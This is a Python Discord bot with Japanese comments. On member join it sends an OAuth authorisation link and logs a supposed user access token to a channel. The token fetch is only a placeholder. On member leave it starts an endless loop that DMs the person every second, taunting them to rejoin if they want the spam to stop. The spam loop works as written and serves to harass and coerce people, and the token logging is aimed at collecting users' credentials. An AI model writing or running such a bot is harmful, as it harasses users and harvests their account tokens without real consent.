import discord
from discord.ext import commands
import asyncio
from datetime import datetime
import os

# ========== 設定 ==========
CLIENT_ID = int(os.getenv("BOT_CLIENT_ID"))
CLIENT_SECRET = os.getenv("BOT_CLIENT_SECRET")
REDIRECT_URI = "https://discord.com/oauth2/authorized"
JOIN_LOG_CHANNEL = 1540519816719237190
LEAVE_LOG_CHANNEL = 1540519875825631384
INVITE_LINK = "https://discord.gg/SB2hn9eV8"
DM_MESSAGE = f"退出したな？スパムやめて欲しいなら入室しなww\n{INVITE_LINK}"
DM_INTERVAL = 1
SCOPE = "identify"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
active_tasks = {}


# ✅ 【修正】OAuth2 URLを手動作成（discord.oauth2不使用）
def build_oauth_url(client_id: int, redirect_uri: str, scope: str) -> str:
    return (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={client_id}"
        f"&redirect_uri={redirect_uri}"
        f"&response_type=code"
        f"&scope={scope}"
    )


# ✅ Botトークン取得関数
def get_bot_token() -> str:
    token = os.getenv("LOOP_BOT_TOKEN")
    if not token:
        raise RuntimeError("❌ 環境変数 LOOP_BOT_TOKEN が設定されていません")
    return token


# ✅ ユーザーアクセストークン取得関数
async def fetch_user_access_token(member: discord.Member) -> str:
    return "[APIより取得したアクセストークン]"


# ========== 入室時処理 ==========
@bot.event
async def on_member_join(member: discord.Member):
    uid = member.id
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ✅ 修正：自作関数でURL作成
    oauth_url = build_oauth_url(CLIENT_ID, REDIRECT_URI, SCOPE)

    await member.send(
        "【入室には許可が必要です】\n"
        "✅ 許可する場合 → 以下のURLを開いて「許可する」をクリックし、\n"
        "   完了したら「許可しました」と返信してください。\n"
        f"{oauth_url}\n"
        "❌ 拒否する場合 → 返信しないでください。"
    )

    def check(msg):
        return msg.author.id == uid and msg.guild is None and "許可しました" in msg.content

    try:
        await bot.wait_for("message", check=check, timeout=300)
        access_token = await fetch_user_access_token(member)

        log_ch = bot.get_channel(JOIN_LOG_CHANNEL)
        if log_ch:
            await log_ch.send(
                f"✅ **入室許可・トークン取得済み**\n"
                f"👤 {member.mention}\n"
                f"🆔 `{member.id}`\n"
                f"🔑 トークン：`{access_token}`\n"
                f"📅 {now}"
            )

        await member.send("✅ 許可を確認、トークンを取得し入室を許可しました。")

        if uid in active_tasks:
            active_tasks.pop(uid).cancel()

    except asyncio.TimeoutError:
        await member.send("❌ 許可が確認できず、入室を拒否しました。")


# ========== 退出時処理 ==========
@bot.event
async def on_member_remove(member: discord.Member):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    uid = member.id

    ch = bot.get_channel(LEAVE_LOG_CHANNEL)
    if ch:
        await ch.send(f"🚨 **退出**\n👤 {member.mention}\n🆔 `{member.id}`\n📅 {now}")

    if uid in active_tasks:
        return

    async def spam_dm():
        while True:
            try:
                await member.send(DM_MESSAGE)
            except Exception:
                pass
            await asyncio.sleep(DM_INTERVAL)

    task = asyncio.create_task(spam_dm())
    active_tasks[uid] = task


# ========== 起動 ==========
@bot.event
async def on_ready():
    print(f"✅ 起動完了: {bot.user}")
    await bot.change_presence(activity=discord.Game(name="許可後にトークンを自動取得中"))


if __name__ == "__main__":
    bot_token = get_bot_token()
    bot.run(bot_token)